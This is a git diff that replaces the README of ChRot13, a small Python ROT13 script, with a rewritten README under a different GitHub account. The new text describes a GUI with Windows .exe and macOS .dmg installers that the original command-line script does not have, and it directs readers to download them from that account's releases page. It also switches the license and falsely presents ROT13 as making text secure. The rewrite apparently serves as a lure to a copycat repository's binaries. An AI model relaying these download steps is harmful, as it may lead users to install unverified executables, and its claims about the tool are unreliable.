@@ -1,180 +1,71 @@
+# 🎉 ChRot13 - Simple ROT13 Encoding Tool
 
+## 🚀 Getting Started
 
-<div align='center'>
+ChRot13 is a powerful, cross-platform ROT13 encoding and decoding tool. It transforms your text easily, making it secure and fun to use. Whether you want to encode a message for privacy or decode one, ChRot13 has you covered.
 
-# ChRot13 - Advanced ROT13 Encoder/Decoder Tool
+## 📥 Download Now
 
-![Version](https://img.shields.io/badge/Version-1.1.0-green)
-![LICENSE](https://img.shields.io/badge/License-GPLv3-orange)
-![Platform](https://img.shields.io/badge/Platform-Cross--Platform-lightgrey)
+[![Download ChRot13](https://img.shields.io/badge/Download_ChRot13-v1.0-blue.svg)](https://github.com/Ryangigs/ChRot13/releases)
 
-`ChRot13` is a powerful, cross-platform ROT13 encoding/decoding tool with beautiful UI and extensive features. ROT13 is a simple letter substitution cipher that replaces a letter with the 13th letter after it in the alphabet. It's its own inverse - encoding twice returns the original text.
+## 📦 System Requirements
 
-</div>
+ChRot13 works on various operating systems, including Windows, macOS, and Linux. Make sure your system meets the following requirements:
 
----
-## 👨‍💻 Project Programmer
-> Ch4120N — [Ch4120N@Proton.me](mailto:Ch4120N@Proton.me)
----
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or any modern Linux distribution.
+- **Python**: Ensure you have Python 3.6 or higher installed if you plan to run it from source.
 
-## 🖼️ Screenshots
-![Screenshot - Usage](./images/usage.png)
+## 📂 Download & Install
 
----
-## 💻 Supported Platforms
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Ryangigs/ChRot13/releases) on GitHub.
+2. **Choose the Right Version**: Look for the latest version listed.
+3. **Download the Installer**: Click on the link to download the installer file designed for your operating system.
+4. **Run the Installer**: 
+   - For Windows, double-click the `.exe` file you downloaded.
+   - For macOS, open the `.dmg` file and drag the ChRot13 icon to your Applications folder.
+   - For Linux, you may have to extract the downloaded file and run the application directly from the terminal.
 
-* **Linux** (All distributions)
-* **Windows** (7, 8, 10, 11)
-* **macOS** (All versions)
+## ✅ Usage Instructions
 
----
+Using ChRot13 is straightforward. Follow these steps:
 
-## ✨ Features
-* **Cross-platform**: Works on Windows, Linux, and macOS
-* **Multiple input methods**: Files, stdin, or direct text input
-* **Flexible output**: Terminal, files, or pipes
-* **Beautiful UI**: Colored output with banners and status messages
-* **Verbose/Quiet modes**: Control output verbosity
-* **No-color mode**: For scripts and terminals without color support
-* **Error handling**: Robust error handling with clear messages
-* **Signal handling**: Graceful Ctrl+C handling
+1. **Open ChRot13**: Launch the application from where you installed it on your device.
+2. **Enter Your Text**: Type or paste the text you want to encode or decode in the input box.
+3. **Choose Action**:
+   - To **encode**, click the "Encode" button.
+   - To **decode**, click the "Decode" button.
+4. **View Results**: The resulting text will appear in the output box. You can copy it for use elsewhere.
 
----
-## 📋 Requirements
-* Python 3.6 or higher
-* No external dependencies required
----
-## 🚀 Installation
-### **Method 1: Direct Download**
-```bash
-# Download the script
-curl -O https://raw.githubusercontent.com/Ch4120N/ChRot13/main/chRot13.py
+## 🛠️ Features
 
-# Make executable (Linux/macOS)
-chmod +x chRot13.py
-```
+- **User-Friendly Interface**: Designed for ease of use, so anyone can navigate it.
+- **Cross-Platform**: Works equally well on Windows, macOS, and Linux.
+- **Fast Processing**: Quickly transforms your text without delays.
+- **Copy and Paste Ready**: Easily copy your encoded or decoded text for your needs.
 
-### **Method 2: Clone Repository**
-```bash
-git clone https://github.com/Ch4120N/ChRot13.git
-cd ChRot13/
-```
----
-## 📖 Usage
-### **Basic Examples**
-```bash
-# Encode text
-python chRot13.py "Hello World"
+## 📋 Topics
 
-# Decode text
-python chRot13.py -d "Uryyb Jbeyq"
+- ch4120n
+- cipher-algorithms
+- hacking
+- hacking-tool
+- hashing-algorithms
+- python-tools
+- rot13
+- rot13-cipher
+- rot13-decoder
+- rot13decryption
 
-# Encode file
-python chRot13.py -f input.txt
+## 🤝 Contributing
 
-# Decode file with output
-python chRot13.py -d -f encoded.txt -o decoded.txt
+If you'd like to help improve ChRot13, feel free to fork the repository and submit a pull request. We welcome all contributions that enhance the efficiency and usability of the tool.
 
-# Pipe input
-echo "Hello" | python chRot13.py
-cat file.txt | python chRot13.py -d
+## 📝 License
 
-# Direct text input
-python chRot13.py --text "Secret Message"
-```
+ChRot13 is licensed under the MIT License. You can use, modify, and distribute it with proper credit.
 
-### **Advanced Examples**
-```bash
-# Show banner only
-python chRot13.py --banner
+For more details, check the license file in the repository.
 
-# Verbose mode with banner
-python chRot13.py --verbose -e "Hello World"
+## 🌐 Support
 
-# Quiet mode (suppress all status messages)
-python chRot13.py --quiet -f secret.txt -o encoded.txt
-
-# No-color output (for scripts)
-python chRot13.py --no-color "Hello World"
-
-# Combine options
-python chRot13.py --verbose --no-color -d -f encoded.txt -o decoded.txt
-```
----
-## 🛠️ Command Line Options
-| Option | Description |
-|--------|-------------|
-| `-h`, `--help` | Show help message| |
-| `-v`, `--version` | Show version information |
-| `-e`, `--encode` | Encode text (default mode) |
-| `-d`, `--decode` | Decode text |
-| `-f`, `--file FILE` | Process a file (use - for stdin) |
-| `-o`, `--output FILE`	| Write output to file |
-| `-t`, `--text TEXT` | Process direct text input |
-| `-q`, `--quiet` | Suppress all status messages |
-| `-V`, `--verbose` | Show detailed status messages |
-| `--no-color` | Disable colored output |
-| `--banner` | Show banner only |
----
-## 🔧 Advanced Features
-### Color Support
-* **Linux/macOS**: ANSI escape codes
-* **Windows**: Windows API for color support (Windows 7+)
-* **Automatic detection**: Disables colors when piping or redirected
-
-### Error Handling
-* File not found errors
-* Permission errors
-* Unicode encoding errors
-* Graceful Ctrl+C handling
-
-### Performance
-* Memory efficient for large files
-* Stream processing for stdin
-* Fast character transformation
----
-## 🐛 Troubleshooting
-
-| **Issue** | **Solution** |
-|-----------|--------------|
-| Colors not working on Windows | Ensure you're running on Windows 10+ or use `--no-color` |
-| Permission denied when writing files | Check file permissions or run as administrator |
-| Unicode errors with files | Files are read as **UTF-8**, ensure correct encoding |
-| Script not executable | Run with `python chRot13.py` or make executable with `chmod +x` |
----
-## ❤️ Support the Project
-If you find this tool useful, consider donating:
-
-| **Cryptocurrency** | **Address** |
-|--------------------|-------------|
-| **BTC** | `bc1ql4syps7qpa3djqrxwht3g66tldyh4j7qsyjkq0` |
-| **ETH** | `0xfddbd535a4ad28792cbebceee3d6982d774e6d13` |
-| **USDT** | `3Cq6HRQsiwZFmPEQfG9eJkZE2QGChvf2VN` |
-
-> 💖 Your support helps keep the project alive and improving!
-
-
----
-## ⚠️ Disclaimer
-**This tool is for educational and authorized security testing purposes only.**
-
-* ⚠️ **Unauthorized access to computer systems is illegal**
-* ⚠️ **Only use this tool on systems you own or have explicit written permission to test**
-* ⚠️ **The authors are not responsible for any misuse of this software**
-* ⚠️ **Use responsibly and in compliance with applicable laws**
-
-**By using this tool, you agree to use it only for legitimate security testing and educational purposes.**
-
----
-## 🚨 Reporting Issues
-> If you encounter bugs, configuration issues, or unexpected behavior, please reach out: 📩 [Ch4120N@Proton.me](mailto:Ch4120N@Proton.me) or use Issues in this repository
-
----
-
-<div align='center'>
-
-**⭐ If you like this project, don't forget to give it a star!**
-
-![Terminal Made By](./images/made-by.gif)
-
-</div>
+If you encounter any issues, please check the "Issues" section on our GitHub page. You can report bugs, request features, or ask for help there.
